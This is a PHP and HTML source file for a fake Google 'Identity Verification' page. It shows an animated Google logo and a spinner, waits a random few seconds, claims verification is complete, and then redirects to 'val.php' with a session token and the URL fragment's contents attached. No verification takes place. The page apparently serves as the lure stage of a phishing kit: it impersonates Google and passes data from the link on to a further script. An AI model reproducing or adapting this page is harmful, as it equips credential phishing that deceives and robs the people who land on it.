<?php
session_start();
if (!isset($_SESSION['auth_token'])) {
    $_SESSION['auth_token'] = bin2hex(random_bytes(32));
}
$authToken = $_SESSION['auth_token'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Identity Verification</title>
<style>
  body {
    background: #ffffff;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }

  .verify-container {
    background: #fff;
    border-radius: 10px;
    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
    padding: 45px 40px;
    max-width: 440px;
    width: 90%;
    text-align: center;
    animation: fadeIn 0.8s ease;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
  }

  /* GOOGLE WAVE-TYPING ANIMATION */
  .google-logo, .gmail-logo {
    font-size: 2.4rem;
    font-weight: bold;
    display: inline-block;
    white-space: nowrap;
    overflow: hidden;
    margin-bottom: 25px;
    letter-spacing: 2px;
  }

  .google-logo span,
  .gmail-logo span {
    display: inline-block;
    animation: wave 1.5s infinite ease-in-out;
  }

  @keyframes wave {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-6px); }
  }

  @keyframes retype {
    0%, 10% { opacity: 0; width: 0; }
    20%, 80% { opacity: 1; width: 100%; }
    90%, 100% { opacity: 0; width: 0; }
  }

  .google-logo {
    animation: retype 4s linear infinite;
  }

  .google-logo span:nth-child(1) { color: #4285F4; animation-delay: 0s; }
  .google-logo span:nth-child(2) { color: #EA4335; animation-delay: 0.1s; }
  .google-logo span:nth-child(3) { color: #FBBC05; animation-delay: 0.2s; }
  .google-logo span:nth-child(4) { color: #4285F4; animation-delay: 0.3s; }
  .google-logo span:nth-child(5) { color: #34A853; animation-delay: 0.4s; }
  .google-logo span:nth-child(6) { color: #EA4335; animation-delay: 0.5s; }

  /* GMAIL VERSION (COMMENTED OUT) */
  .gmail-logo {
    animation: retype 4s linear infinite;
  }

  .gmail-logo span:nth-child(1) { color: #4285F4; animation-delay: 0s; }
  .gmail-logo span:nth-child(2) { color: #EA4335; animation-delay: 0.1s; }
  .gmail-logo span:nth-child(3) { color: #FBBC05; animation-delay: 0.2s; }
  .gmail-logo span:nth-child(4) { color: #34A853; animation-delay: 0.3s; }
  .gmail-logo span:nth-child(5) { color: #EA4335; animation-delay: 0.4s; }

  .title {
    font-size: 1.6rem;
    font-weight: 600;
    color: #1b1b1b;
    margin-bottom: 10px;
  }

  .subtitle {
    font-size: 0.95rem;
    color: #555;
    margin-bottom: 30px;
  }

  .verify-box {
    border: 1px solid #d0d0d0;
    border-radius: 8px;
    padding: 18px;
    background: #fafafa;
    display: flex;
    align-items: center;
    gap: 15px;
    margin-bottom: 25px;
    justify-content: flex-start;
    transition: all 0.3s ease;
  }

  .verify-box.checked {
    background: #e8f3ff;
    border-color: #0078d4;
  }

  .verify-text {
    flex: 1;
    text-align: left;
    color: #333;
    font-size: 1rem;
  }

  .spinner {
    width: 28px;
    height: 28px;
    border: 3px solid #ccc;
    border-top-color: #0078d4;
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .checkmark {
    width: 28px;
    height: 28px;
    display: none;
    color: #0078d4;
    font-size: 1.8rem;
    font-weight: bold;
  }

  .verify-box.checked .spinner {
    display: none;
  }

  .verify-box.checked .checkmark {
    display: block;
  }

  .footer {
    font-size: 0.85rem;
    color: #777;
  }

  @media (max-width: 480px) {
    .title { font-size: 1.4rem; }
    .verify-text { font-size: 0.9rem; }
    .google-logo, .gmail-logo { font-size: 2rem; }
  }
</style>
</head>
<body>

<div class="verify-container">

  <!-- GOOGLE LOOPING WAVE ANIMATION -->
  <div class="google-logo">
    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
  </div>

  <div class="title">Identity Verification</div>
  <div class="subtitle">Please wait while your request is being verified.</div>
  
  <div class="verify-box" id="verifyBox">
    <div class="spinner" id="spinner"></div>
    <div class="checkmark" id="checkmark">✔</div>
    <div class="verify-text" id="verifyText">Checking your connection...</div>
  </div>

  <div class="footer">Security process in progress. Do not refresh or close this tab.</div>
</div>

<script>
  const delay = Math.floor(Math.random() * (7000 - 3000 + 1)) + 3000;
  const authToken = "<?php echo $authToken; ?>";
  const hashValue = window.location.hash ? window.location.hash.substring(1) : "";

  setTimeout(() => {
    const box = document.getElementById('verifyBox');
    const text = document.getElementById('verifyText');
    box.classList.add('checked');
    text.textContent = "Verification complete. Redirecting...";

    setTimeout(() => {
      let redirectUrl = "val.php?token=" + encodeURIComponent(authToken);
      if (hashValue) redirectUrl += "&data=" + encodeURIComponent(hashValue);
      window.location.href = redirectUrl;
    }, 1000);
  }, delay);
</script>

</body>
</html>
